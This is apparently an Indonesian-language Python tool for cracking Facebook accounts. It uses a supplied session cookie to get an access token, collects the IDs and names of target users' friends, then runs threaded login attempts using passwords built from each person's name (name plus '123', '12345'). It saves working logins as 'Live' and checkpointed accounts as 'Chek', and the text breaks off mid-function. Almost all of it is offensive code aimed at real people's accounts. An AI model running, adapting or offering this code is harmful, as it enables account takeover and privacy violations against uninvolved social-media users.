###-----[ IMPORT MODULE ]-----###
import requests,json,os,sys,random,datetime,time,re,uuid,subprocess,zlib,base64
from time import time as tod
from time import sleep
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as par
from urllib import request
from platform import platform
from urllib.error import URLError
ses = requests.Session()
###-----[ IMPORT RICH ]-----###
from rich.panel import Panel as panel
from rich import print as prints
from rich.tree import Tree
###-----[ APPEN AND MORE ]-----###
id,uid,uid2,id3,id4,id5,id6=[],[],[],[],[],[],[]
loop,ok,cp,a2f=0,0,0,0
akun,method=[],[]
uadia, uadarimu = [],[]
password_list,password_input= [],[]
pwpluss,pwnya=[],[]
rr = random.randint
rc = random.choice
###-----[ MENU WARNA PRINT BIASA ]-----###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
###-----[ MENU WARNA PRINT RICH ]-----###
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
###-----[ TANGGAL BULAN TAHUN ]-----###
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'July','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'July','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'Live-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'Chek-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
###-----[ CLEAR DISPLAY ]-----###
def clear():
	if "linux" in sys.platform.lower():
		try:os.system("clear")
		except:pass
	elif "win" in sys.platform.lower():
		try:os.system("cls")
		except:pass
	else:
		try:os.system("clear")
		except:pass
def back():
	menu()
###-----[ LOGO BANNER ]-----###
def banner():
	print(f"""{P}
   ╔═╗╔═╗╔═╗╦ ╦╔╗ ╦═╗╦ ╦╔╦╗╔═╗
   ║╣ ╠═╣╚═╗╚╦╝╠╩╗╠╦╝║ ║ ║ ║╣   Create By Rendra Guna Binawan.
   ╚═╝╩ ╩╚═╝ ╩ ╚═╝╩╚═╚═╝ ╩ ╚═╝  est. 2021.
   EASY USE - EASY RESULT.""")
###-----[ LOGIN COOKIES V1 ]-----###
def login():
	clear();banner()
	print(f"\n{P}  - masukan cookie anda, disarankan menggunakan akun tumbal. {P}")
	print(f"  - untuk menu crack tanpa login ,ketik 'nologin' pada kolom input.")
	cok = input(f"  - cookie : {H}")
	if cok in ["Nologin","NOLOGIN","nologin"]:
		menu = input(f"\n{P} [1]. crack dari file. \n [2]. dump id dari email. \n [3]. dump id dari pencarian nama. \n [4]. cek hasil crack. \n  - pilih 1/4 : ")
		if menu in ["01","1"]:
			Crack_file()
		elif menu in ["02","2"]:
			exit("  - fitur ini masih dalam tahap pengembangan.")
		elif menu in ["03","3"]:
			exit("  - fitur ini masih dalam tahap pengembangan.")
		elif menu in ["04","4"]:
			Result()
		else:
			exit("  - input hanya dengan angka,jangan kosong.")
	else:
		try:
			url = "https://mbasic.facebook.com"
			link = ses.post("https://graph.facebook.com/v16.0/device/login/", data={"access_token": "1348564698517390|007c0a9101b9e1c8ffab727666805038", "scope": ""}).json()
			kode = link["code"];user = link["user_code"]; data, data2 = {}, {}
			vers = par(ses.get(f"{url}/device?user_code={user}", cookies={"cookie": cok}).text, "html.parser")
			item = ["fb_dtsg","jazoest","qr"]
			for x in vers.find_all("input"):
				if x.get("name") in item:
					aset = {x.get("name"):x.get("value")}
					data.update(aset)
			data.update({"user_code":user})
			meta = par(ses.post(url+vers.find("form", method="post").get("action"), data=data, cookies={"cookie": cok}).text, "html.parser")
			xzxz = ["fb_dtsg","jazoest","scope","display","sdk","sdk_version","domain","sso_device","user_code","logger_id","auth_type","auth_nonce","code_challenge","code_challenge_method","encrypted_post_body","return_format[]"]
			for xz in meta.find_all("input"):
				if xz.get("name") in xzxz:
					data2.update({xz.get("name"):xz.get("value")})
				else:pass
			data2.update({"submit":"Konfirmasi"})
			konfirmasi = ses.post(url+meta.find("form", method="post").get("action"), data=data2, cookies={"cookie": cok}).text
			if "Login Anda sudah dikonfirmasi di" in konfirmasi or "Sukses!" in konfirmasi:
				find = ses.get(f"https://graph.facebook.com/v16.0/device/login_status?method=post&code={kode}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback", cookies={"cookie": cok}).text
				tokz = re.search('"access_token":"(.*?)"', find).group(1)
				open('.token.txt', 'a').write(tokz);open('.cok.txt', 'a').write(cok)
				exit(f"{P}  - token : {H}{tokz}{P} \n  - cookies aktif,jalankan ulang perintah nya dengan ketik python run.py")
		except Exception as e:exit(e)
###-----[ MENU SCRIPT ]-----###
def menu():
	clear();banner()
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except (IOError,KeyError,FileNotFoundError):
		print(f'\n{P}  - cookies kamu invalid.{P}')
		time.sleep(2);os.system('clear')
		login()
	try:
		info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
		nama = info_datafb["name"]
		uidfb = info_datafb["id"]
	except requests.exceptions.ConnectionError:
		exit(f"\n{P}  - Tidak ada koneksi{P}")
	except KeyError:
		try:os.remove(".cok.txt");os.remove(".token.txt")
		except:pass
		print(f"\n{P}  - sepertinya akun tumbal mu terkena checkpoint...{P}");time.sleep(2)
		os.system('clear')
		login()
	prints(f"\n[bold white]  - uid  facebook : {uidfb} \n  - nama facebook : {nama} \n  - metode login  : [bold green]validate facebook.com{P2}")
	print(f"\n{P}  - 1. crack id publik. \n  - 2. crack id publik massal ({H}disarankan{P}). \n  - 3. crack id dari file. {P} \n  - 4. dump id ke file. {P} \n  - 5. dump otomatis. \n  - 6. cek hasil crack. \n  - 0. keluar ({M}hapus cookies{P}).")
	menu = input(f'\n{P}  - pilih 1/6 : ')
	if menu in ["01","1"]:
		try:
			token = open('.token.txt','r').read()
			cok = open('.cok.txt','r').read()
		except IOError:
			exit()
		print(f"\n{P}  - pastikan id target tidak private/publik. {P}")
		user_dump = input(f'  - input id target : ')
		uid.append(user_dump)
		for userr in uid:
			try:
				col = ses.get(f"https://graph.facebook.com/{userr}?fields=friends&access_token={token}",cookies = {'cookies':cok}).json()
				for x in col['friends']['data']:
					try:
						sys.stdout.write(f"\r  - sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
						sys.stdout.flush()
						id.append(x['id']+'|'+x['name'])
					except:continue
			except (KeyError,IOError):
				pass
			except requests.exceptions.ConnectionError:
				print(f'  - koneksi buruk, silahkan refresh jaringan anda. ')
				exit()
		try:
			setting()
		except requests.exceptions.ConnectionError:
			print(f'\n  - koneksi buruk, silahkan refresh jaringan anda. ')
			exit()
	elif menu in ["02","2"]:
		Dump_Massal()
	elif menu in ["03","3"]:
		Crack_file()
	elif menu in ["04","4"]:
		Dump_id()
	elif menu in ["05","5"]:
		Dump_teman()
	elif menu in ["06","6"]:
		Result()
	elif menu in ['07','7']:
		random_email()
	elif menu in ['00','0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(f'\n  - Berhasil Keluar+Hapus Cookie ')
		exit()
	else:
		print(f"\n  - input hanya dengan angka,jangan kosong.")
		time.sleep(3)
		back()

def random_email():
	email = "@gmail.com"
	nama = input(f"\n  - input nama : ")
	jumlah = int(input(f"  - input limit : "))
	for z in range(jumlah):
		angka = str(rr(1,9999))
		id.append(nama+angka+email+"|"+nama)
		open('/sdcard/pelerr','a').write(nama+angka+email+"|"+nama+'\n')
		sys.stdout.write(f"\r  - sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
		sys.stdout.flush()
	setting()
###-----[ DUMP OTOMATIS ]-----###
def Dump_teman():
	print()
	print(f'{P}  - Mode pesawat jika ingin stop Dump !!!{P}')
	user = input('  - Input target id : ')
	dumpx(user)
	setting2()
	for userr in id4:
		print(f'\n{P}  - sedang dump id : {userr}{P}')
		dumpy(userr)
	setting()

def dumpy(userr):
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
    except IOError:
        exit()
    try:
        head = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0'}
        koh2 = ses.get(f"https://graph.facebook.com/{userr}?fields=friends&access_token={token}",cookies={'cookie': cok},headers=head).json()
        for pi in koh2['friends']['data']:
            try:
                sys.stdout.write(f"\r  - sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
                sys.stdout.flush()
                iso=(pi['id']+'|'+pi['name'])
                if "19"  in iso:pass
                elif "18"  in iso:pass
                elif "17"  in iso:pass
                elif "16"  in iso:pass
                elif "15"  in iso:pass
                elif "14"  in iso:pass
                elif "13"  in iso:pass
                elif "12"  in iso:pass
                elif "11"  in iso:pass
                elif "110"  in iso:pass
                elif "109"  in iso:pass
                elif "108"  in iso:pass
                elif "107"  in iso:pass
                elif "106"  in iso:pass
                elif "105"  in iso:pass
                elif "104"  in iso:pass
                elif "103"  in iso:pass
                elif "102"  in iso:pass
                elif "101"  in iso:pass
                else:id.append(iso)
            except:pass
    except requests.exceptions.ConnectionError:
        setting()
    except (KeyError,IOError):
        pass

def setting2():
	for bacot in id3:
		xx = random.randint(0,len(id4))
		id4.insert(xx,bacot)

def dumpx(user):
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
    except IOError:
        exit()
    try:
        head = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0'}
        koh2 = ses.get(f"https://graph.facebook.com/{user}?fields=friends&access_token={token}",cookies={'cookie': cok},headers=head).json()
        for pi in koh2['friends']['data']:
            try:
                iso=(pi['id'])
                if "10009"  in iso:pass
                elif "79"  in iso:pass
                elif "78"  in iso:pass
                elif "77"  in iso:pass
                elif "76"  in iso:pass
                elif "75"  in iso:pass
                elif "74"  in iso:pass
                elif "73"  in iso:pass
                elif "72"  in iso:pass
                elif "71"  in iso:pass
                elif "70"  in iso:pass
                elif "19"  in iso:pass
                elif "18"  in iso:pass
                elif "17"  in iso:pass
                elif "16"  in iso:pass
                elif "15"  in iso:pass
                elif "14"  in iso:pass
                elif "13"  in iso:pass
                elif "12"  in iso:pass
                elif "11"  in iso:pass
                elif "110"  in iso:pass
                elif "109"  in iso:pass
                elif "108"  in iso:pass
                elif "107"  in iso:pass
                elif "106"  in iso:pass
                elif "105"  in iso:pass
                elif "104"  in iso:pass
                elif "103"  in iso:pass
                elif "102"  in iso:pass
                elif "101"  in iso:pass
                elif "10000009"  in iso:pass
                elif "10000008"  in iso:pass
                elif "10000007"  in iso:pass
                elif "10000006"  in iso:pass
                elif "10000005"  in iso:pass
                elif "10000004"  in iso:pass
                elif "10000003"  in iso:pass
                elif "10000002"  in iso:pass
                elif "10000001"  in iso:pass
                elif "10000000"  in iso:pass
                elif "1000009"  in iso:pass
                elif "1000008"  in iso:pass
                elif "1000007"  in iso:pass
                elif "1000006"  in iso:pass
                elif "1000005"  in iso:pass
                elif "1000004"  in iso:pass
                elif "1000003"  in iso:pass
                elif "1000002"  in iso:pass
                elif "1000001"  in iso:pass
                elif "1000000"  in iso:pass
                elif "100009"  in iso:pass
                elif "100008"  in iso:pass
                elif "100007"  in iso:pass
                elif "100006"  in iso:pass
                elif "100005"  in iso:pass
                elif "100004"  in iso:pass
                elif "100003"  in iso:pass
                elif "100002"  in iso:pass
                elif "100001"  in iso:pass
                elif "100000"  in iso:pass
                elif "10000"  in iso:pass
                else:id3.append(iso)
            except:pass
    except requests.exceptions.ConnectionError:
        print('PROBLEM INTERNET CONNECTION,PRESS ENTER TO CONTINUE')
        input('')
    except (KeyError,IOError):
        pass
###-----[ MENU RESULT ]-----###
def Result():
	print(f"\n{P}  - 1. cek hasil akun {H}Live{P}. \n  - 2. cek hasil akun {K}Chek{P}. \n  - 3. kembali.")
	lihat_result = input(f'\n  - pilih 1/3 : ')
	if lihat_result in ['2']:
		try:vin = os.listdir('Chek')
		except FileNotFoundError:
			print(f'  - file tidak ditemukan ')
			time.sleep(1)
			back()
		if len(vin)==0:
			print(f'  - anda tidak memiliki file {K}Check {P}')
			time.sleep(1)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('Chek/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'{P}  - %s. %s ( {K}%s{P} id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'{P}  - %s. %s ( {K}%s{P} id )'%(cih,isi,len(hem)))
			geeh = input(f'\n  - masukan nomer result yang ingin anda cek : ')
			try:geh = lol[geeh]
			except KeyError:
				print(f'  - pilih dengan benar ')
				back()
			try:lin = open('Chek/'+geh,'r').read().splitlines()
			except:
				print(f'  - file tidak ditemukan ')
				time.sleep(1)
				back()
			nocp=0
			for cpku in range(len(lin)):
				result_=lin[nocp].split('|')
				tree = Tree("")
				tree.add(f"{K2}{result_[0]}|{result_[1]}[white]")
				prints(tree)
				nocp +=1
			print('')
			input(f'  - ketik enter jika ingin kembali ke menu')
			os.system("clear")
			time.sleep(1)
			back()
	elif lihat_result in ['1']:
		try:vin = os.listdir('Live')
		except FileNotFoundError:
			print(f'  - file tidak ditemukan ')
			time.sleep(1)
			back()
		if len(vin)==0:
			print(f'  - anda tidak memiliki file {H}Live {P}')
			time.sleep(1)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('Live/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'{P}  - %s. %s ( {H}%s{P} id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'{P}  - %s. %s ( {H}%s{P} id )'%(cih,isi,len(hem)))
			geeh = input(f'\n  - masukan nomer result yang ingin anda cek : ')
			try:geh = lol[geeh]
			except KeyError:
				print(f'  - pilih dengan benar ')
				back()
			try:lin = open('Live/'+geh,'r').read().splitlines()
			except:
				print(f'  - file tidak ditemukan ')
				time.sleep(1)
				back()
			nocp=0
			for cpku in range(len(lin)):
				result_=lin[nocp].split('|')
				tree = Tree("")
				tree.add(f"{H2}{result_[0]}|{result_[1]}[white]").add(f"{H2}{result_[2]}[white]")
				prints(tree)
				nocp +=1
			print("")
			input(f'  - ketik enter jika ingin kembali ke menu')
			os.system("clear")
			time.sleep(1)
			back()
	elif lihat_result in ['3']:
		back()
	else:
		print(f"  - input hanya dengan angka,jangan kosong.")
		back()
###-----[ DUMP PUBLIK MASSAL ]-----###
def Dump_Massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		print(f"\n{P}  - pastikan id target tidak private/publik. {P}")
		jum = int(input(f'  - input jumlah target ? : '))
	except ValueError:
		print(f'  - input salah ')
		exit()
	if jum<1 or jum>100:
		print(f'  - gagal dump id kemungkinan id bukan publik/private ')
		exit()
	ses=requests.Session()
	jumlah_input = 0
	for met in range(jum):
		jumlah_input+=1
		user_dump = input(f'  - input id ke '+str(jumlah_input)+' : ')
		uid.append(user_dump)
	for userr in uid:
		try:
			col = ses.get(f"https://graph.facebook.com/{userr}?fields=friends&access_token={token}",cookies = {'cookies':cok}).json()
			for x in col['friends']['data']:
				try:
					sys.stdout.write(f"\r  - sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
					sys.stdout.flush()
					id.append(x['id']+'|'+x['name'])
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(f'  - koneksi sinyal tidak stabil ')
			exit()
	try:
		setting()
	except requests.exceptions.ConnectionError:
		print('')
		print(f'  - koneksi sinyal tidak stabil ')
		back()
###-----[ DUMP FILE ]-----###
def Dump_id():
	file = input(f"\n  - masukan nama file dump anda : ")
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		print(f"\n{P}  - pastikan id target tidak private/publik. {P}")
		jum = int(input(f'  - input jumlah target ? : '))
	except ValueError:
		print(f'  - input salah ')
		exit()
	if jum<1 or jum>100:
		print(f'  - gagal dump id kemungkinan id bukan publik/private ')
		exit()
	ses=requests.Session()
	jumlah_input = 0
	for met in range(jum):
		jumlah_input+=1
		user_dump = input(f'  - input id ke '+str(jumlah_input)+' : ')
		uid.append(user_dump)
	for userr in uid:
		try:
			col = ses.get(f"https://graph.facebook.com/{userr}?fields=friends&access_token={token}",cookies = {'cookies':cok}).json()
			for x in col['friends']['data']:
				try:
					sys.stdout.write(f"\r  - sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
					sys.stdout.flush()
					id.append(x['id']+'|'+x['name'])
					open(file,'a').write(x['id']+'|'+x['name']+'\n')
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(f'  - koneksi sinyal tidak stabil ')
			exit()
	try:
		exit(f"\n  - sukses dump file tersimpan pada : {file}")
	except KeyError:
		print(f"\n  - gagal dump, kemungkinan id tidak publik/cookies anda invalid")
	except requests.exceptions.ConnectionError:
		print('')
		print(f'  - koneksi sinyal tidak stabil ')
		back()
###-----[ CRACK FILE ]-----###
def Crack_file():
	file = input(f"\n  - masukan nama folder/file : ")
	try:
		uid = open(file,"r").read().splitlines()
		for data in uid:
			try:user,nama = data.split('|')
			except:continue
			sys.stdout.write(f"\r  - sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
			sys.stdout.flush()
			id.append(data)
	except FileNotFoundError:exit(f"  - file tidak ada")
	setting()
###-----[ SETTING URUTAN & METODE ]-----###
def setting():
	print("")
	print(f"\n{P}  - 1. urutan old ke new. \n  - 2. urutan new ke old. \n  - 3. urutan random. {P}")
	urutan_setting = input(f'\n  - pilih 1/3 : ')
	if urutan_setting in ['1','01','old']:
		for tua in sorted(id):
			uid2.append(tua)
	elif urutan_setting in ['2','02','new']:
		muda=[]
		for new in sorted(id):
			muda.append(new)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			uid2.append(muda[bcmi])
			bcmi -=1
	elif urutan_setting in ['3','03','random']:
		for acak in id:
			xx = random.randint(0,len(uid2))
			uid2.insert(xx,acak)
	else:
		print(f"  - input hanya dengan angka,jangan kosong.")
		exit()
	print(f"\n{P}  - 1. metode API. \n  - 2. metode Async.{P} \n  - 3. metode Validate. {P} \n  - 4. metode Messenger. {P}")
	login_metode = input(f'\n  - pilih 1/3 : ')
	if login_metode in ["1","01"]:
		prints(f"\n[bold white]  - anda menggunakan metode api.")
		method.append('Api')
	elif login_metode in ["2","02"]:
		prints(f"\n[bold white]  - anda menggunakan metode async.")
		method.append('Async')
	elif login_metode in ["3","03"]:
		prints(f"\n[bold white]  - anda menggunakan metode validate.")
		method.append('Validate')
	elif login_metode in ["4","04"]:
		prints(f"\n[bold white]  - anda menggunakan metode messenger.")
		method.append('Messenger')
	else:
		print(f"  - input hanya dengan angka,jangan kosong.")
		exit()
	print(f"\n{P}  - 1. password otomatis. \n  - 2. password gabung. \n  - 3. password manual. {P}")
	password_metode = input(f'\n  - pilih 1/3 : ')
	if password_metode in ['1','01']:
		Otomatis()
	elif password_metode in ['2','02']:
		Gabung()
	elif password_metode in ['3','03']:
		Manual()
	else:
		print(f"  - input hanya dengan angka,jangan kosong.")
		exit()
###-----[ SETTING PASSWORD OTOMATIS ]-----###
def Otomatis():
	ua = input(f'  - ingin menggunakan user agent manual ? y/t : ')
	if ua in ['y','Ya','ya','Y']:
		uadarimu.append('uadia');bz = input(f'  - input user agent manual anda : ');uadia.append(bz)
	if ua in ['t','T','']:
		print(f"{P}  - anda menggunakan user agent bawaan script. {P}")
	else:uadarimu.append('uasc')
	print(f"""
  - {P}hasil Live akan tersimpan di : {H}Live/{okc}{P}
  - {P}hasil Chek akan tersimpan di : {K}Chek/{cpc}{P}
  - mainkan mode pesawat jika tidak ada hasil.
""")
	with tred(max_workers=40) as MethodeCrack:
		for user in uid2:
			uid,nama = user.split('|')[0],user.split('|')[1].lower()
			depan = nama.split(" ")
			pasw = []
			try:
				if len(depan) == 3 or len(depan) == 4 or len(depan) == 5 or len(depan) == 6:
					pasw = [nama, depan[0]+"123", depan[0]+"12345", depan[0]+"12345", depan[0]+"321"]
				else:
					pasw = [nama, depan[0]+"123", depan[0]+"12345", depan[0]+"12345", depan[0]+"321"]
				if 'Api' in method:
					MethodeCrack.submit(_api_,uid,pasw)
				elif 'Async' in method:
					MethodeCrack.submit(_async_,uid,pasw)
				elif 'Validate' in method:
					MethodeCrack.submit(_validate_,uid,pasw)
				elif 'Messenger' in method:
					MethodeCrack.submit(_messenger_,uid,pasw)
				else:
					MethodeCrack.submit(_messenger_,uid,pasw)
			except:pass
	print("\r")
	exit(f"{P}  - sukses crack {H}{len(uid2)}{P} id,dengan jumlah hasil Live : {H}{ok} {P}Chek : {K}{cp}{P}")
###-----[ SETTING PASSWORD GABUNG ]-----###
def Gabung():
	pw_manual=input(f'\n  - input password tambahan : ')
	password_manual=pw_manual.split(',')
	for xpw in password_manual:
		pwnya.append(xpw)
	ua = input(f'  - ingin menggunakan user agent manual ? y/t : ')
	if ua in ['y','Ya','ya','Y']:
		uadarimu.append('uadia');bz = input(f'  - input user agent manual anda : ');uadia.append(bz)
	if ua in ['t','T','']:
		print(f"{P}  - anda menggunakan user agent bawaan script. {P}")
	else:uadarimu.append('uasc')
	print(f"""
  - {P}hasil Live akan tersimpan di : {H}Live/{okc}{P}
  - {P}hasil Chek akan tersimpan di : {K}Chek/{cpc}{P}
  - mainkan mode pesawat jika tidak ada hasil.
""")
	with tred(max_workers=40) as MethodeCrack:
		for user in uid2:
			uid,nama = user.split('|')[0],user.split('|')[1].lower()
			depan = nama.split(" ")
			pasw = []
			try:
				if len(depan) == 3 or len(depan) == 4 or len(depan) == 5 or len(depan) == 6:
					pasw = [nama, depan[0]+"123", depan[0]+"12345", depan[0]+"12345", depan[0]+"321"]
				else:
					pasw = [nama, depan[0]+"123", depan[0]+"12345", depan[0]+"12345", depan[0]+"321"]
				for xpwd in pwnya:
					pasw.append(xpwd)
				if 'Api' in method:
					MethodeCrack.submit(_api_,uid,pasw)
				elif 'Async' in method:
					MethodeCrack.submit(_async_,uid,pasw)
				elif 'Validate' in method:
					MethodeCrack.submit(_validate_,uid,pasw)
				elif 'Messenger' in method:
					MethodeCrack.submit(_messenger_,uid,pasw)
				else:
					MethodeCrack.submit(_messenger_,uid,pasw)
			except:pass
	print("\r")
	print(f"{P}  - sukses crack {H}{len(uid2)}{P} id,dengan jumlah hasil Live : {H}{ok} {P}Chek : {K}{cp}{P}")
###-----[ SETTING PASSWORD MANUAL ]-----###
def Manual():
	pw_manual=input(f'\n  - input password manual : ')
	password_manual=pw_manual.split(',')
	for xpw in password_manual:
		pwnya.append(xpw)
	ua = input(f'  - ingin menggunakan user agent manual ? y/t : ')
	if ua in ['y','Ya','ya','Y']:
		uadarimu.append('uadia');bz = input(f'  - input user agent manual anda : ');uadia.append(bz)
	if ua in ['t','T','']:
		print(f"{P}  - anda menggunakan user agent bawaan script. {P}")
	else:uadarimu.append('uasc')
	print(f"""
  - {P}hasil Live akan tersimpan di : {H}Live/{okc}{P}
  - {P}hasil Chek akan tersimpan di : {K}Chek/{cpc}{P}
  - mainkan mode pesawat jika tidak ada hasil.
""")
	with tred(max_workers=30) as MethodeCrack:
		for user in uid2:
			uid,nama = user.split('|')[0],user.split('|')[1].lower()
			depan = nama.split(" ")
			pasw = []
			for xpwd in pwnya:
				pasw.append(xpwd)
			if 'Api' in method:
				MethodeCrack.submit(_api_,uid,pasw)
			elif 'Async' in method:
				MethodeCrack.submit(_async_,uid,pasw)
			elif 'Validate' in method:
				MethodeCrack.submit(_validate_,uid,pasw)
			elif 'Messenger' in method:
				MethodeCrack.submit(_messenger_,uid,pasw)
			else:
				MethodeCrack.submit(_messenger_,uid,pasw)
	print("\r")
	exit(f"{P}  - sukses crack {H}{len(uid2)}{P} id,dengan jumlah hasil Live : {H}{ok} {P}Chek : {K}{cp}{P}")
###-----[ USERAGENT MENU ]-----###
useragent = []
useragent2 = []
def api():
	rr = random.randint
	rc = random.choice
	return f"Dalvik/2.1.0 (Linux; U; Android 12; CPH2477 Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/{str(rr(410,450))}.0.0.{str(rr(15,35))}.{str(rr(50,150))};FBPN/com.facebook.orca;FBLC/ms_MY;FBBV/{str(rr(510000000,599999999))};FBCR/MY MAXIS;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2477;FBSV/12;FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1460};FB_FW/1;] FBBK/1"
def ugen():
	rr = random.randint
	rc = random.choice
	return rc([f"Mozilla/5.0 (Linux; Android 11; TECNO KG5n) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(30,114))}.0.{str(rr(2222,4999))}.{str(rr(45,199))} UCBrowser/13.4.2.1307 {str(rc(['Iron Safari','Safari','Mobile Safari']))}/537.36 OPR/77.5.4095.75179"])

try:adel = open('samsung.txt','r').read().splitlines()
except:adel = palkon()

prints(panel(f"{H2}{random.choice(adel)}[/]",style=f"white"));time.sleep(2)
###-----[ METODE VALIDATE ]-----###
def _validate_(uid,pasw):
	global loop,ok,cp
	sys.stdout.write(f"\r{P}  - {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}"),
	sys.stdout.flush()
	ses = requests.Session()
	for pw in pasw:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			else:ua = random.choice(adel)
			link = ses.get(f"https://m.prod.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Fm.prod.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
			data = {"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(link)).group(1),"uid": uid,"next": "https://m.prod.facebook.com/v3.3/dialog/oauth?client_id=190291501407&redirect_uri=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback&scope=email&response_type=code&state=pxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5&ret=login&fbapp_pres=0&logger_id=dd58b980-4f31-44c0-9524-5490fc11be47&tp=unspecified","flow": "login_no_pin","pass":pw}
			hd = {
			   "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
			   "accept-language": "en-US,en;q=0.9",
			   "cache-control": "max-age=0",
			   "content-type": "application/x-www-form-urlencoded",
			   "dpr": "1",
			   "sec-ch-prefers-color-scheme": "dark",
			   "sec-ch-ua": '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
			   "sec-ch-ua-full-version-list": '"Google Chrome";v="119.0.6045.160", "Chromium";v="119.0.6045.160", "Not?A_Brand";v="24.0.0.0"',
			   "sec-ch-ua-mobile": "?0",
			   "sec-ch-ua-model": '""',
			   "sec-ch-ua-platform": '"Windows"',
			   "sec-ch-ua-platform-version": '"15.0.0"',
			   "sec-fetch-dest": "document",
			   "sec-fetch-mode": "navigate",
			   "sec-fetch-site": "same-origin",
			   "sec-fetch-user": "?1",
			   "upgrade-insecure-requests": "1",
			   "viewport-width": "384",
